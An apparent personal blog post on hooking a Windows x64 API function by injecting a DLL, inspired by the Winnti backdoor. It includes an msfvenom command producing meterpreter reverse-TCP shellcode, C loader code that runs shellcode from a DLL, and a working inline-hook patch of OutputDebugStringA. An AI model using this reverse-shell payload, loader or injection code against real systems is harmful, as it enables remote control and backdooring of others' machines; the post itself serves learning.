---
layout: post
title: "winapi hooking via injected DLL"
---

Hook a windows API function in an arbitrary process (x64) by injecting a DLL that creates the hook.

# winapi hooking via injected DLL

This is a little excercise that tries to solve the following task:  
Hook a Win API function that gets called in an arbitrary process. 

It is inspired to some extent by the [Winnti malware](https://web.br.de/interaktiv/winnti/english/), which modifies running services by installing a magic packet triggered backdoor. Without digging to deep into how the malware works, one option would be by hooking windows network APIs, looking for a trigger word and executing some backdoor code when it is found. Else normal operation would continue. Assuming operation from user mode.

Be warned, this is not a post on building a similar malware but simply aimed at understanding and implementing a function hook by injecting a DLL into a process.


In order to this we write hooking code for a chosen Win API function, put it in a DLL and inject the DLL into some target process.

This example is split into two parts, one consisting of prerequisites and the other deals with the programming.

prep phase:
+ Injecting meterpreter shellcode and executing through a DLL
+ DLL Debugging 
+ choosing the target function

tackling the problem:
+ writing the hooking code
+ building an exe to test the hook
+ adopting for x64
+ porting over to a DLL file

## Injecting meterpreter shellcode and executing through a DLL

At first I had some issues with executing meterpreter shellcode from a simple, self written DLL. This is due to a difference in execution of the shellcode depending on whether it is run from an .exe file or a .dll. Additionally, I noticed another issue when starting the DLL main or function via rundll32.exe. The executed shellcode does not keep the main thread from exiting. Therefor, I had to keep the DLL from exiting through either sleep or an infinite loop.

### Differences in starting the shellcode 

First things first, the chosen shellcode was a meterpreter windows x64 reverse tcp shell created with

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f c > code.c`

The shellcode is then embedded in a simple c file and compiled as a DLL with cl 

`cl.exe /O2 /D_USRDLL /D_WINDLL hook.c /MT /link /DLL /OUT:Hook.dll`

Also, as described [here](https://stackoverflow.com/questions/1130479/how-to-build-a-dll-from-the-command-line-in-windows-using-msvc), the same can be achieved with just `cl /LD <files>`

The shellcode execution in an exe file can either be done by specifying the code location as the starting point for a new thread like so:

```c
    exec = VirtualAlloc(0, lensh, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(exec, shellcode, lensh);
	VirtualProtect(exec, lensh, PAGE_EXECUTE_READ, &oldprotect);
	thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec, 0, 0, 0);
	WaitForSingleObject(thread, 0);
```

<!-- ![](/assets/images/winhook/shellcode_exec_with_thread.png) -->

or by casting it to a function pointer and invoking that function.

```c
    exec = VirtualAlloc(0, lensh, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(exec, shellcode, lensh);
    VirtualProtect(exec, lensh, PAGE_EXECUTE_READ, &oldprotect);
	((void(*)())exec)();
```
<!-- ![](/assets/images/winhook/shellcode_exec_with_funcPtr_casting.png) -->

The latter didn't work for me and timed out the msfconsole handler, but only when compiled as a DLL! When compiling the code as an .exe the shellcode worked just fine. Not sure why this is. Changing threading compilation flags was my first guess but did not seem to solve the issue.

This is the output of the handler when trying to connect:

![](/assets/images/winhook/dll_code_nonThreadedShellcodeStart.png)

It is simply sitting there, timing out and dying. Poor thing.

Also, when starting the _threaded shellcode_ dll through rundll32.exe, the code has to have either an endless loop or a sleep after the `CreateThread` call. If this is not in place, the DLL function seems to exit and kills the process while the meterpreter reverse shell hasn't even been established. Another option is simply calling a non existing method. This pops up an error _MessageBox_ that keeps the process alive. Obviously this is only an option while testing.

![](/assets/images/winhook/2020.06.11-22.34_1.gif)

I believe this an issue of the specific shellcode in use. Not sure exactly why it behaves like it does but might just be the main thread exiting and not waiting for the meterpreter thread.

## DLL Debugging

Because it is nice to debug code in one way or another, I looked up different debugging options for injected DLLs. Two things came up, first the nice and clean way aaand ... good old dirty printf debugging.   
Obviously I picked the latter.  
Nonetheless having other options is always nice so I will keep information on both options here.

__Visual Studio injected DLL debugging__  
It is actually pretty easy to debug an injected DLL with Visual Studio. You just need to open a DLL project, build your DLL and attach VS to the process you want to inject the DLL into. Then comes the injection - nothing fancy is required, a basic DLL injection works fine - and thats it.

![](/assets/images/winhook/dll_debug_attach_to_process.png)

The information was found on the Game Hacking forums ([VS debugging of DLL](https://guidedhacking.com/threads/debugging-dll-for-internal-hack.7760/)). 

__print Debugging of DLL code__  
The second way was actually more interesting for me because it worked by creating a console window and directing standard input, output and error towards it. This came really handy since I was already wondering what is necessary to redirect output (eg printf) from DLL code to a console window. This didn't solve the the issue but is a nice hack around it ([GetStdHandle](https://docs.microsoft.com/en-us/windows/console/getstdhandle) function maybe?!).

So in order to get output of the DLL, the following code has to be included:

```c
    AllocConsole();
    freopen("CONIN$", "r", stdin);
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);

```

The functions are pretty self explanatory by name or input. Now we can debug and easily analyze the exe or dll with x64dbg and `printf` and `getchar`.

The technique / code was taken from this post [printf for dll debugging](https://www.codeproject.com/Tips/227809/Good-Old-Dirty-printf-Debugging-in-a-Non-console-C).


## Picking an API function

### Unknown functions and tracing

In order to hook anything, we have to know the API function. If functionality of a foreign executable should be modified, then the relevant API function has to be identified. One way ofdoing that is by tracing the execution with x64dbg. 
This was something I looked into at first but ultimately decided against it and build my own program with a function that gets hooked.

The reason I switched to another method is because I tried to do a call trace on `notepad.exe` with x64dbg, but the trace condition wasn't accepted (`dis.iscall(cip)`). I later found out, that you simply have to pause the program before you can do any tracing... 

Information on tracing can also be found in the [x64dbg documentation](https://help.x64dbg.com/en/latest/introduction/ConditionalTracing.html) and here [logging calls and jumps](https://forum.tuts4you.com/topic/40049-problems-logging-all-jumpscalls/).

### Finding a suitable function

Since the example programm is self built, an arbitrary function can be picked. I first tried it with `OutputDebugString`.  
Initially I had some issues because I wanted to modify the jump location by subtraction a pointer to my Modified function from the destination address of the jump. This didn't work because my code wasn't within the 2GB boundary for jumps. And since `jmp` only allows jumps that fit within 32 bits I had to pick another approach

![](/assets/images/winhook/failedSimpleProg_OutputDebugString_JumpTable.png) 

In the above image you can see the jump to the kernel32 function code from the memory address that gets returned by referencing the function `OutputDebugStringA`. In this prologue the function gets handed a refernce to its only argument in `ECX`. `ECX` is the first argument for all common windows calling conventions, be it 32 or 64 bit. 


### Testing with working code

At this point I wasn't sure if I missed something essential, so I was looking into some working code in order to modify it. That way I could make sure to have atleast a working base. 

So I was looking for examples and found something on [ired.team](https://ired.team/). This is just a phenomenal ressource that I had already bookmarked for its plethora of knowledge.

I have adapted the [windows API hooking](https://ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++) example to 64bit with the following code:

```c
    char patch[12] = {0};
    memcpy_s(patch, 1, "\x48", 1); // mov
    memcpy_s(patch+1, 1, "\xb8", 1); // rax,
    memcpy_s(patch+2, 8, &hookedMessageBoxAddress, 8); // immediate 64bit value
    // mov rax, imm64 
    memcpy_s(patch+10, 1, "\x50", 1); // push rax
    memcpy_s(patch+11, 1, "\xc3",1); // ret
```

The comments pretty much show the modifications. THe `jmp` was replaced by a `mov; push; ret` sequence. I decided for using `RAX` because it is pretty safe to use. Because it is not one of the default registers for function arg passing in windows calling conventions and being the register for return values and all.  
Also, I found a pretty neat discussion of different `trampoline` instruction sequences at the [ragestorm blog](https://www.ragestorm.net/blogs/?p=107) and [this stackoverflow question](https://stackoverflow.com/questions/16917643/how-to-push-a-64bit-int-in-nasm).


## Wrapping up

With all this knowledge on how everything works, putting it all together was a breeze.

I wrote the following code for a simple target process:

```c
#include <windows.h>
#include <stdio.h>

void main(){
    printf("get char....");
    getchar();
    OutputDebugStringA("secrety_secret...hex hex");
}
```

and this for the dll:

```c
#include <windows.h>

void __stdcall myOutputDebugStringA(LPCSTR lpOutputString) {
    printf(lpOutputString);
}

void run(void) {
    void * HookOutputDebugStringA = &myOutputDebugStringA;
    DWORD oldprotect = 0;
    void * funcAdress;
    
    funcAdress = (void*)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "OutputDebugStringA");
    VirtualProtect(funcAdress, 100, PAGE_EXECUTE_READWRITE, &oldprotect);

    char patch[12] = {0};
    memcpy_s(patch, 1, "\x48", 1); // mov
    memcpy_s(patch+1, 1, "\xb8", 1); // rax,
    memcpy_s(patch+2, 8, &HookOutputDebugStringA, 8); // immediate 64bit value
    memcpy_s(patch+10, 1, "\x50", 1); // push rax
    memcpy_s(patch+11, 1, "\xc3",1); // ret
    memcpy(funcAdress, patch, sizeof(patch));
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {
	switch ( fdwReason ) {
			case DLL_PROCESS_ATTACH:
					run();
			case DLL_THREAD_ATTACH:
			case DLL_THREAD_DETACH:
			case DLL_PROCESS_DETACH:
					break;
			}
	return TRUE;
}
```

and used it with a basic dll injector.

![](/assets/images/winhook/hook.gif)

As you can see in the above gif, executing the program in powershell doesn't give any output. After hooking the function and redirecting the `OutputDebugString` arg into printf, the secret is revealed.